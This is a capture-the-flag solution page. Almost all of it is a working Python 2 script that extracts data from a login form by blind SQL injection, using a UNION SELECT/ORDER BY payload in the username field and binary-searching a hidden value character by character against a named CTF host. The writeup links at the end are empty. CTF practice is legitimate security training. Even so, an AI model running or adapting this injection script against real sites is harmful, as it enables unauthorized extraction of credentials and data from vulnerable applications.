#### Goals
 * Get the flag

#### Solution
```python
#!/usr/bin/env python

import requests
import os
import sys


def getTermialSize():
    size = os.popen("stty size").read().split()
    size[0] = int(size[0])
    size[1] = int(size[1])
    return size


def buildUrl(url, params):
    url += "?"
    for key in params:
        url += '%s=%s&' % (key, params[key])
    return url[0:-1]


def searchLower(gotData):
    return search(gotData, ord("a"), ord("z") + 1)


def searchUpper(gotData):
    return search(gotData, ord("A"), ord("Z") + 1)


def searchNumber(gotData):
    return search(gotData, ord("0"), ord("9") + 1)


def searchSymbol1(gotData):
    return search(gotData, 0x20, 0x2f + 1)


def searchSymbol2(gotData):
    return search(gotData, 0x3a, 0x40 + 1)


def searchSymbol3(gotData):
    return search(gotData, 0x5b, 0x60 + 1)


def searchSymbol4(gotData):
    return search(gotData, 0x7b, 0x7e + 1)

def clearScreen():
    os.system("clear")

def judgeLetter(gotData, p):
    url = "http://web2.sniperoj.cn:10004/"
    params = {
        "username": "admin' union select 1,1,'%s' order by 3--+" % (gotData + '_'),
        "password": "",
    }
    target = buildUrl(url, params)
    response = requests.get(target)
    content = response.text
    if content.startswith('admin'):
        return p.upper()
    else:
        return p.lower()


def search(gotData, left, right):
    LEFT = left
    RIGHT = right
    LENGTH = RIGHT - LEFT
    WIDTH = 128
    P = (left + right) / 2
    while True:
        url = "http://web2.sniperoj.cn:10004/"
        # print '[?] Guessing : [%d]=[%s]' % (P, chr(P))
        #blackList = ["\\", "&", "=", "#"]
        #if chr(P) in blackList:
        #    params = {
        #        "username": "admin' union select 1,1,'%s' order by 3--+" % (gotData + '%' + hex(P)[2:]),
        #        "password": "",
        #    }
        #else:
        #    params = {
        #        "username": "admin' union select 1,1,'%s' order by 3--+" % (gotData + chr(P)),
        #        "password": "",
        #    }

        params = {
            "username": "admin' union select 1,1,'%s' order by 3--+" % (gotData + chr(P)),
            "password": "",
        }
        target = buildUrl(url, params)
        # print "[+] Getting : [%s]" % (target)
        response = requests.get(target)
        content = response.text
        if content.startswith('1'):
            left = P
        elif content.startswith("admin"):
            right = P
        else:
            P -= 1
            print "[-] Error : [%s]" % (content)
            continue
        '''
        if content.startswith('admin'):
            right = P
        else:
            left = P
        '''
        P = (left + right) / 2
        log = "[+]" + " " + "[%s]" % (chr(LEFT)) + '-' * + int(((P - LEFT) * 1.0 / (LENGTH)) * WIDTH) + "[%s]" % (chr(P)) + '-' * int(((RIGHT - P) * 1.0 / (LENGTH)) * WIDTH) + "[%s]" % (chr(RIGHT))
        sys.stdout.write("\r" + log)
        sys.stdout.flush()
        if abs(right - left) < 2:
            print "\r"
            if (P <= LEFT) or (P >= RIGHT):
                return (False, chr(P))
            else:
                return (True, chr(P))

def main():
    clearScreen()
    if len(sys.argv) <= 1:
        data = ""
    else:
        data = sys.argv[1]
    '''
    for i in range(32):
        print "[+] Recviced : [%s]" % (data)
        result = []
        result.append(searchLower(data))
        result.append(searchUpper(data))
        result.append(searchNumber(data))
        result.append(searchSymbol1(data))
        result.append(searchSymbol2(data))
        result.append(searchSymbol3(data))
        result.append(searchSymbol4(data))
        print "[+] Recommend :",
        for j in result:
            if j[0]:
                print "[%s]" % (j[1]),
        print ""
        choice=raw_input("[?] Please choice : ")
        data += choice[0]
        clearScreen()
    '''
    for i in range(32):
        print "[+] Recviced : [%s]" % (data)
        print "[+] Length : [%s]" % (len(data))
        data += search(data, 0x20, 0x7f)[1]
        clearScreen()
    print "[+] Finished !"
    print "[+] Result : [%s]" % data

if __name__ == "__main__":
    main()
```

#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

